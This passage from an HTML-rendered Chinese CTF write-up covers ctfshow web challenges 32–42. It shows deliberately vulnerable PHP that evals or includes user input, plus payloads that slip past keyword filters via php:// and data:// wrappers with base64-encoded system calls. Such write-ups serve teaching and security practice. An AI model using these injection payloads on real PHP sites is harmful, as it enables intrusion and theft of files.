+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;more:一页一页的显示档案内容
+less:与 more 类似 head:查看头几行
+tac:从最后一行开始显示，可以看出 tac 是
+cat 的反向显示
+tail:查看尾几行
+nl：显示的时候，顺便输出行号
+od:以二进制的方式读取档案内容
+vi:一种编辑器，这个也可以查看
+vim:一种编辑器，这个也可以查看
+sort:可以查看
+uniq:可以查看 
+file -f:报错出具体内容 
+grep:在当前目录中，查找后缀有 file 字样的文件中包含 &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; 字符串的文件，并打印出该字符串的行。此时，可以使用如		下命令： grep &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; *file
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;web32&#34;&gt;web32&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/flag|system|php|cat|sort|shell|\.| |\&amp;#39;|\`|echo|\;|\(/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+    
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;过滤的数量逐渐变多。&lt;/p&gt;
+&lt;p&gt;payload：?c=include $_GET[&amp;ldquo;asuka&amp;rdquo;] ?&amp;gt;&amp;amp;asuka=php://filter/read=convert.base64-encode/resource=flag.php&lt;/p&gt;
+&lt;h2 id=&#34;web33---36&#34;&gt;web33 - 36&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/flag|system|php|cat|sort|shell|\.| |\&amp;#39;|\`|echo|\;|\(|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+    
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;跟上一题没啥区别。&lt;/p&gt;
+&lt;p&gt;payload：?c=include $_GET[&amp;ldquo;asuka&amp;rdquo;]?&amp;gt;&amp;amp;asuka=php://filter/read=convert.base64-encode/resource=flag.php&lt;/p&gt;
+&lt;p&gt;顺带一提可以使用post形式的payload。&lt;/p&gt;
+&lt;p&gt;?c=include$_POST[asuka]?&amp;gt;
+asuka=php://filter/read=convert.base64-encode/resource=flag.php&lt;/p&gt;
+&lt;h2 id=&#34;web37&#34;&gt;web37&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/flag/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+        
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;看似过滤的只有flag，实则是文件包含，选择使用伪协议。&lt;/p&gt;
+&lt;p&gt;payload：data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==&lt;/p&gt;
+&lt;p&gt;这里使用了data伪协议，会将后续的输入当做php代码执行，由于过滤了flag，所以这里采用了base64编码进行绕过。&lt;/p&gt;
+&lt;h2 id=&#34;web38-39&#34;&gt;web38-39&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;//flag in flag.php
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/flag|php|file/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+        
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;相比上一题过滤了php和file。&lt;/p&gt;
+&lt;p&gt;payload：data://text/plain;base64, PD9waHAgc3lzdGVtKCJjYXQgZioiKTs=&lt;/p&gt;
+&lt;h2 id=&#34;web40&#34;&gt;web40&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/[0-9]|\~|\`|\@|\#|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;$|\%|\^|\&amp;amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&amp;#39;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|\,|\&amp;lt;|\.|\&amp;gt;|\/|\?|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+        
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里过滤了许多符号，这道题可以使用无参数读取。&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/NPFS/p/13778333.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;无参数读取&lt;/a&gt;。首先使用 scandir(current(localeconv())) 查看当前目录所有文件名。&lt;/p&gt;
+&lt;p&gt;我们可以发现flag.php在数组的倒数第二个值里，我们可以通过 array_reverse 进行逆转数组，然后用next()函数进行下一个值的读取，成功读取flag.php文件。&lt;/p&gt;
+&lt;p&gt;payload:?c=highlight_flie(next(array_reverse(scandir(current(localeconv())))));&lt;/p&gt;
+&lt;h2 id=&#34;web41&#34;&gt;web41&lt;/h2&gt;
+&lt;p&gt;很难。&lt;/p&gt;
+&lt;p&gt;这里放上&lt;a class=&#34;link&#34; href=&#34;https://wp.ctf.show/d/137-ctfshow-web-web41&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;大佬的wp&lt;/a&gt;。&lt;/p&gt;
+&lt;h2 id=&#34;web42&#34;&gt;web42&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
